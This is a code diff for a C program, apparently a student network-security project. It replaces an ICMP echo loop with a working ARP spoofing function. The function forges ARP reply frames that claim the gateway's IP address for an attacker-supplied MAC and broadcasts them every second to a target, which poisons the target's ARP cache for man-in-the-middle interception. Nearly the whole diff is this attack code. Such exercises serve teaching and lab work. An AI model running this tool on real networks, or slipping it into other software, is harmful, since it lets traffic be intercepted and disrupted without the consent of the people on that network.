@@ -44,7 +44,7 @@ static const char	*get_default_interface(void)
 	printf("default interface is %s\n", interfaces->name);
 	return (interfaces->name);
 }
-/*
+
 static void	get_gateway(char *gateway_ip)
 {
 	FILE			*fp;
@@ -77,28 +77,71 @@ static void	get_gateway(char *gateway_ip)
 	fprintf(stderr, "Could not find gateway\n");
 	fclose(fp);
 }
-*/
-static void	send_icmp(char *ip_target)
+
+static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip_target, char *mac_target, bool verbose)
 {
 	int					sock;
-	char				packet[256];
-	struct icmp 	*icmp;
-	struct sockaddr_in	target;
+	char				buffer[42];
+	struct ether_header	*eth;
+	struct ether_arp	*arp;
+	struct sockaddr_ll	device;
+	u_char				source_mac[MAC_ADDR_LEN];
+	char				gateway_ip[16] = {0};
 
-	icmp = (struct icmp *)packet;
-	sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
-	icmp->icmp_type = ICMP_ECHO;
-	icmp->icmp_code = 0;
-	icmp->icmp_cksum = 0;
-	icmp->icmp_id = getpid();
-	icmp->icmp_seq = 1;
-
-	target.sin_family = AF_INET;
-	target.sin_addr.s_addr = inet_addr(ip_target);
-	while (1)
+	eth = (struct ether_header *)buffer;
+	arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));
+	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+	if (sock < 0)
 	{
-		sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&target, sizeof(target));
+		perror("socket");
+		exit(1);
 	}
+	if (sscanf(mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+		&source_mac[0], &source_mac[1], &source_mac[2],
+		&source_mac[3], &source_mac[4], &source_mac[5]) != 6)
+	{
+		fprintf(stderr, "Invalid MAC address\n");
+		exit(1);
+	}
+	get_gateway(gateway_ip);
+	memset(eth->ether_dhost, 0xff, ETH_ALEN);
+	memcpy(eth->ether_shost, source_mac, ETH_ALEN);
+	eth->ether_type = htons(ETH_P_ARP);
+
+	arp->arp_hrd = htons(ARPHRD_ETHER);
+	arp->arp_pro = htons(ETH_P_IP);
+	arp->arp_hln = ETH_ALEN;
+	arp->arp_pln = 4;
+	arp->arp_op = htons(ARPOP_REPLY);
+
+	memcpy(arp->arp_sha, source_mac, ETH_ALEN);
+	inet_pton(AF_INET, gateway_ip, arp->arp_spa);
+	memset(arp->arp_tha, 0, ETH_ALEN);
+	inet_pton(AF_INET, ip_target, arp->arp_tpa);
+
+	memset(&device, 0, sizeof(device));
+	device.sll_family = AF_PACKET;
+	device.sll_ifindex = if_nametoindex(dev);
+	if (device.sll_ifindex == 0)
+	{
+		perror("if_nametoindex");
+		exit(1);
+	}
+	device.sll_halen = ETH_ALEN;
+	while(1)
+	{
+		printf("sending arp reply to %s\n", ip_target);
+		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
+		{
+			perror("sendto");
+			exit(1);
+		}
+		sleep(1);
+	}
+	(void)verbose;
+	(void)mac_target;
+	(void)ip_src;
+	close(sock);
 }
 
 
@@ -156,12 +199,6 @@ int	main(int argc, char **argv)
 	if (dev == NULL)
 			dev = get_default_interface();
 	printf("dev is %s\n", dev);
-	send_icmp(ip_target);
-	//set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target, verbose);
-//	(void)errbuf;
-	(void)verbose;
-	(void)mac_target;
-	(void)ip_src;
-	(void)mac_src;
+	set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target, verbose);
 	return (0);
 }
